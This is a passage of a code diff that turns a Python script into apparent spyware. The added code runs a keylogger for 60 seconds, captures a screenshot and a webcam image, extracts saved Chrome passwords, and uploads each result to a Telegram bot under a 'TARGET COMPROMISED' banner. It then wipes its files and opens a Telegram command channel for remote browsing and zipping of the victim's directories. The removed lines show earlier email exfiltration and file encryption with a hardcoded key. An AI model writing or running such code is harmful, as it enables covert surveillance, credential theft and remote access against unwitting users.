+                subprocess.run(['ipconfig', '/all'], stdout=system_info, stderr=subprocess.DEVNULL, shell=True, text=True)
+            except:
+                system_info.write("Failed to get network info\n")
         
-        # To generate a key: Do the Following in the Python Console->
-        # from cryptography.fernet import Fernet
-        # Fernet.generate_key()
+        # 2. KEYLOGGER (Short duration)
+        send_telegram_message("⌨️ <b>Phase 2: Starting keylogger (60 seconds)...</b>")
+        keylog_file = os.path.join(file_path, 'keylogger.txt')
         
-        key = b'MujBTqtZ4QCQW_fmlMHVWBmTVRW8IGZSuxFctu_D3d0='
-
-        for file in files:
+        def quick_keylogger():
             try:
-                file_full_path = os.path.join(file_path, file)
-                if os.path.exists(file_full_path):
-                    with open(file_full_path, 'rb') as plain_text:            # Opens the file in binary format for reading
-                        data = plain_text.read()
-                    encrypted = Fernet(key).encrypt(data)
-                    encrypted_file_path = os.path.join(file_path, 'e_' + file)
-                    with open(encrypted_file_path, 'ab') as hidden_data:    # Appending to the end of the file if it exists
-                        hidden_data.write(encrypted)
-                    os.remove(file_full_path)
+                with open(keylog_file, 'w', encoding='utf-8') as f:
+                    def on_press(key):
+                        try:
+                            f.write(f"{time.strftime('%H:%M:%S')} - {key}\n")
+                            f.flush()
+                        except:
+                            pass
+                    
+                    from pynput.keyboard import Listener
+                    with Listener(on_press=on_press) as listener:
+                        time.sleep(60)  # Only 60 seconds
+                        listener.stop()
             except Exception as e:
-                logging.error(f'Encryption error for file {file}: {e}')
-
-        # Send encrypted files to email account
+                logging.error(f'Keylogger error: {e}')
+        
+        # Run keylogger in separate thread
+        import threading
+        keylog_thread = threading.Thread(target=quick_keylogger)
+        keylog_thread.start()
+        keylog_thread.join(timeout=65)
+        
+        # 3. SCREENSHOT AND WEBCAM CAPTURE
+        send_telegram_message("📸 <b>Phase 3: Capturing images...</b>")
         try:
-            send_email(file_path)
-            screenshots_dir = os.path.join(file_path, 'Screenshots')
-            if os.path.exists(screenshots_dir):
-                send_email(screenshots_dir)
+            # Take screenshot
+            screenshot_path = os.path.join(file_path, 'screenshot.png')
+            pic = ImageGrab.grab()
+            pic.save(screenshot_path)
             
-            webcam_dir = os.path.join(file_path, 'WebcamPics')
-            if os.path.exists(webcam_dir):
-                send_email(webcam_dir)
+            # Capture webcam image
+            webcam = cv2.VideoCapture(0)
+            ret, frame = webcam.read()
+            if ret:
+                webcam_path = os.path.join(file_path, 'webcam.jpg')
+                cv2.imwrite(webcam_path, frame)
+                send_telegram_message("✅ Screenshot and webcam image captured")
+            else:
+                send_telegram_message("✅ Screenshot captured, but webcam failed")
+            webcam.release()
         except Exception as e:
-            logging.error(f'Email sending error: {e}')
+            send_telegram_message(f"❌ Image capture failed: {str(e)}")
 
-        # Clean Up Files
+        # 4. EXTRACT CHROME PASSWORDS
+        send_telegram_message("🔐 <b>Phase 4: Extracting Chrome passwords...</b>")
+        chrome_password_file = extract_and_send_chrome_passwords(file_path)
+        
+        # 5. FINAL COMPILATION AND SENDING
+        send_telegram_message("📦 <b>Phase 5: Compiling and sending all data...</b>")
+        
+        # Collect all created files
+        collected_files = []
+        
+        # Check and add each file if it exists
+        potential_files = {
+            'System Info': system_info_path,
+            'Keylogger Data': keylog_file,
+            'Chrome Passwords': chrome_password_file,
+            'Screenshot': screenshot_path,
+            'Webcam Photo': webcam_path
+        }
+        
+        for description, filepath in potential_files.items():
+            if filepath and os.path.exists(filepath):
+                collected_files.append((description, filepath))
+        
+        # Send each file
+        for description, filepath in collected_files:
+            try:
+                caption = f"📁 <b>{description}</b>"
+                send_telegram_file(filepath, caption)
+                time.sleep(1)  # Avoid rate limiting
+            except Exception as e:
+                logging.error(f"Failed to send {description}: {e}")
+                
+        # 6. FINAL SUMMARY
+        summary = f"""
+🎉 <b>MISSION ACCOMPLISHED</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+🎯 <b>TARGET PROFILE</b>
+├─ 👤 User: <code>{WINDOWS_USERNAME}</code>
+├─ 💻 System: <code>{hostname}</code>
+├─ 🌐 IP: <code>{IPAddr}</code>
+└─ ⏰ Time: {time.strftime('%H:%M:%S')}
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ <b>DATA COLLECTED:</b>
+├─ 🔐 Chrome Passwords
+├─ 💻 System Information
+├─ ⌨️ Keystroke Logs
+└─ 📸 Screenshot
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+🚨 <b>TARGET COMPROMISED</b>
+• Passwords extracted and ready for use
+• Full system access obtained
+• Surveillance complete
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+        """
+        
+        send_telegram_message(summary)
+
+        # 7. CLEANUP
         try:
-            shutil.rmtree(file_path)
-        except Exception as e:
-            logging.error(f'Cleanup error: {e}')
+            shutil.rmtree(file_path, ignore_errors=True)
+        except:
+            pass
 
-        main()  # Loop
+        # 8. Start polling in non-blocking mode
+        send_telegram_message("🤖 <b>Directory navigation bot activated. Use commands:</b>\n/list [path] - List directory contents\n/cd [path] - Change directory\n/zip [path] - Zip and send directory/file")
+        application.run_polling()
 
     except Exception as e:
-        logging.basicConfig(level=logging.DEBUG, filename=os.path.join(str(BASE_LOG_PATH), 'error_log.txt'))
-        logging.exception(f'* Error Occurred in main: {e} *')
-
-
-# When an error occurs a detailed full stack trace can be logged to a file for an admin;
-# while the user receives a much more vague message preventing information leakage.
+        logging.error(f'Error in main: {e}')
+        send_telegram_message(f"🚨 <b>ERROR:</b>\n{str(e)[:200]}")
 
 if __name__ == '__main__':
     try:
+        # Test connection
+        send_telegram_message("🤖 <b>SYSTEM ONLINE</b>\nStarting password extraction...")
         main()
-
+        
     except KeyboardInterrupt:
-        print('* Control-C entered...Program exiting *')
-
+        send_telegram_message("🛑 <b>MANUAL STOP</b>")
+        
     except Exception as ex:
-        error_log_path = os.path.join(str(BASE_LOG_PATH), 'error_log.txt')
-        logging.basicConfig(level=logging.DEBUG, filename=error_log_path)
-        logging.exception(f'* Error Occurred: {ex} *')
-        print(f'An error occurred. Check logs at: {error_log_path}')
+        send_telegram_message(f"💥 <b>CRASH:</b>\n{str(ex)[:200]}")
